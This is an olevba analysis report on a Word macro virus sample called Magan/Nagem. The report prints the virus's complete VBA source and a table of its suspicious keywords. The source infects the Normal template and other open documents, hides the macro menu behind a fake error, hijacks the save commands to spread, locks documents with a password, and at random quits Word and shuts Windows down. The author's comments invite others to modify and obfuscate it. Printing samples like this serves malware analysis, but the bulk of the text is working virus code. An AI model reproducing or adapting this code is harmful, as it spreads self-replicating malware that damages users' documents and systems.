olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nagem
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nagem - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Magan_Macro.bas 
in file: Virus.MSWord.Nagem - OLE stream: 'Macros/VBA/Magan_Macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Distributed for Changes/Upgradation etc. in
'Open Source Code.
' If you are interested in developing,modifying,
'crypting etc. this document using your skills,
'you are FREE to do so.
' Don't forget to give credits also to
'"Anonymous Creater of Megan V1.0"
' Nick of course is Magan
' Best of Luck
' Explanation Also Included.

Dim Ni, Di As Integer
Sub AutoOpen()
'There are no destructive routines in
'this document.
On Error GoTo 1

'Find if Normal is already infected!
With Normal.ThisDocument.VBProject.VBComponents
    For Ni = 1 To .Count
            If (.Item(Ni).Name = "Magan_Macro") Then
                GoTo 3
            End If
    Next Ni
End With

'Infect Normal
With ThisDocument.VBProject.VBComponents
    For Di = 1 To .Count
       If (.Item(Di).Name = "Magan_Macro") Then
          .Item(Di).Export ("MaganM.BAS")
          ' I know that the above is not the best way, still,
          'It is the easiest to understand.
          Normal.ThisDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
          Kill ("MaganM.BAS")
          Exit For
       End If
Next Di
End With

GoTo 2

3

With ActiveDocument.VBProject.VBComponents
For Ni = 1 To .Count
            If (.Item(Ni).Name = "Magan_Macro") Then
                GoTo 1
            End If
Next Ni
End With

With Normal.ThisDocument.VBProject.VBComponents
For Di = 1 To .Count
       If (.Item(Di).Name = "Magan_Macro") Then
          .Item(Di).Export ("MaganM.BAS")
          ActiveDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
          Kill ("MaganM.BAS")
          Exit For
       End If
Next Di
End With
ActiveDocument.Saved = False
2
Normal.ThisDocument.Saved = False
1
End Sub

Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Disables the Tools->Macro->Macros... command under English version of Word."
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.ToolsMacro1"
'This macro disables the Tools->Macros->Macros...
'Command under English version of Word.

'If you are here, you know the in and out of the
'macro programming i belive.
MsgBox "This Command is Unavaliable this time.", vbCritical, "Microsoft Word"
End Sub


Sub AutoClose()
'No fun without an activation routine.
On Error Resume Next
If (Val(Left$(Date$, 2)) > 20) Then
    'Change "password" to Rnd*100 if you like!
    'Then, the document can never be unprotected again.
    ActiveDocument.Protect wdAllowOnlyComments, , "password"
End If
If (Val(Left$(Date$, 2)) > 10) Then
    If (Rnd * 100 < 50) Then
       'Quits without saving :)
       'Then tries Restarts the Computer
       'Restart works only if there is a delay
       Shell "RunDLL.EXE USER,ExitWindows", vbHide
       ThisDocument.Application.Quit
    End If
End If
End Sub

Sub FileSave()
'Just to Spread.
'Note : Works only under English Version.
On Error Resume Next
AutoOpen
ActiveDocument.Save
End Sub

Sub FileSaveAs()
'Just to Spread.
'Note : Works only under English Version.
On Error Resume Next
AutoOpen
Dialogs(wdDialogFileSaveAs).Show
AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RunDLL.EXE          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

